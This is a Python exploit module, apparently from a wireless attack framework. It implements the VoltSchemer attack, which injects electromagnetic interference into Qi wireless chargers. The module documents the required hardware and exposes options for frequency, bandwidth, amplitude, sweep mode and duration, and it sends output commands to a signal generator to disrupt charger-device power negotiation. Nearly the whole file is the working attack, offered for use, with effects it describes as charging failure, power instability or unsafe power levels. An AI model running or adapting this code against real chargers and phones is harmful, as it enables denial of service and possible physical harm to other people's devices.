# Author: André Henrique (LinkedIn/X: @mrhenrike)
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """VoltSchemer: Signal Interference via Qi Charger Manipulation.

    By injecting electromagnetic interference (EMI) into the Qi
    wireless charging communication channel, an attacker can disrupt
    the power negotiation between charger and device.  The Qi
    protocol relies on amplitude-modulated signals at specific
    frequencies for communication; injecting noise at those
    frequencies corrupts control packets and breaks the negotiation
    handshake.

    When power negotiation fails, the charger may default to an
    unsafe power level, repeatedly restart the charging cycle, or
    refuse to charge altogether.  This denial-of-service condition
    persists as long as the interference source is active.

    The attack exploits the unprotected Qi communication channel:
    there is no error correction or authentication strong enough
    to withstand targeted EMI at the negotiation frequencies.

    Hardware requirements:
    - Signal generator capable of 100 kHz to 300 kHz range
      (e.g., Rigol DG1022Z or similar, $200-400)
    - RF amplifier for the target frequency band
    - Coil antenna matched to Qi operating frequency (~110-205 kHz)
    - Oscilloscope or spectrum analyzer for monitoring (optional)
    - Modified Qi charger with exposed communication lines (optional)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "VoltSchemer: Signal Interference via Qi Charger",
        "description": (
            "Injects electromagnetic interference into the Qi "
            "wireless charging communication channel to disrupt "
            "power negotiation between charger and device.  "
            "Corrupts amplitude-modulated control packets at Qi "
            "operating frequencies (110-205 kHz), causing charging "
            "failures, power instability, or denial of service.  "
            "Requires signal generator and coil antenna matched to "
            "Qi frequency band.  CVSS 5.5 (availability impact)."
        ),
        "authors": (
            "Zihao Zhan et al. (University of Florida, VoltSchemer)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/conference/usenixsecurity24/presentation/zhan",
            "https://voltschemer.com/",
            "https://www.wirelesspowerconsortium.com/knowledge-base/specifications/",
        ),
        "disclosure_date": "2024-02-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Any Qi-compatible smartphone or device",
            "Qi chargers relying on unprotected AM communication",
        ),
    }

    target = OptIP("", "Target device description")
    port = OptPort(1, "Not used (electromagnetic attack)")
    timeout = OptFloat(60.0, "Interference duration in seconds")
    siggen_device = OptString("simulate", "Signal generator serial device or 'simulate'")
    center_freq = OptFloat(127.5, "Center frequency in kHz (Qi range: 110-205)")
    bandwidth = OptFloat(20.0, "Interference bandwidth in kHz")
    amplitude = OptFloat(1.0, "Signal amplitude in Vpp")
    sweep_mode = OptString("fixed", "Sweep mode: 'fixed', 'linear', or 'random'")
    sweep_rate = OptFloat(1.0, "Frequency sweep rate in kHz/sec (for sweep modes)")

    _QI_FREQ_MIN = 110.0
    _QI_FREQ_MAX = 205.0

    def _validate_params(self) -> bool:
        freq = float(self.center_freq)
        bw = float(self.bandwidth)
        low = freq - bw / 2.0
        high = freq + bw / 2.0
        if low < self._QI_FREQ_MIN or high > self._QI_FREQ_MAX:
            return False
        if float(self.amplitude) <= 0:
            return False
        if str(self.sweep_mode) not in ("fixed", "linear", "random"):
            return False
        return True

    def _start_signal(self, freq: float, amplitude: float) -> bool:
        if str(self.siggen_device) == "simulate":
            return True
        try:
            with open(str(self.siggen_device), "wb") as f:
                cmd = (
                    f"FREQ:{freq:.2f}KHZ;"
                    f"AMPL:{amplitude:.3f}VPP;"
                    f"BW:{self.bandwidth:.2f}KHZ;"
                    f"MODE:{str(self.sweep_mode).upper()};"
                    f"OUT:ON\n"
                )
                f.write(cmd.encode())
            return True
        except OSError:
            return False

    def _stop_signal(self) -> bool:
        if str(self.siggen_device) == "simulate":
            return True
        try:
            with open(str(self.siggen_device), "wb") as f:
                f.write(b"OUT:OFF\n")
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        if str(self.siggen_device) == "simulate":
            return True
        try:
            with open(str(self.siggen_device), "rb"):
                return True
        except OSError:
            return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"Invalid parameters: center_freq={self.center_freq} kHz, "
                f"bandwidth={self.bandwidth} kHz, amplitude={self.amplitude} Vpp. "
                f"Frequency must be within Qi range "
                f"({self._QI_FREQ_MIN}-{self._QI_FREQ_MAX} kHz)."
            )
            return

        print_success(
            f"VoltSchemer signal interference: "
            f"{self.center_freq} kHz +/- {float(self.bandwidth) / 2.0} kHz, "
            f"{self.amplitude} Vpp, mode={self.sweep_mode}, "
            f"duration={self.timeout}s"
        )
        self._exploit()

    def _exploit(self) -> None:
        freq = float(self.center_freq)
        amp = float(self.amplitude)

        print_status(
            f"Starting EMI injection at {freq} kHz "
            f"(bandwidth: {self.bandwidth} kHz, mode: {self.sweep_mode})"
        )

        if not self._start_signal(freq, amp):
            print_error("Signal generator communication failed")
            return

        print_info(
            f"Interference active: disrupting Qi power negotiation "
            f"packets at {freq} kHz"
        )

        start = time.monotonic()
        interval = 5.0
        while time.monotonic() - start < float(self.timeout):
            remaining = float(self.timeout) - (time.monotonic() - start)
            time.sleep(min(interval, remaining))
            if remaining <= 0:
                break
            elapsed = time.monotonic() - start
            print_info(
                f"EMI active: {elapsed:.0f}s / {self.timeout}s "
                f"at {freq} kHz, {amp} Vpp"
            )

        self._stop_signal()
        print_success(
            f"Signal interference attack complete. "
            f"EMI injected at {freq} kHz for {self.timeout}s. "
            "Qi power negotiation was disrupted during the attack window. "
            "Monitor target for charging failures or power instability."
        )
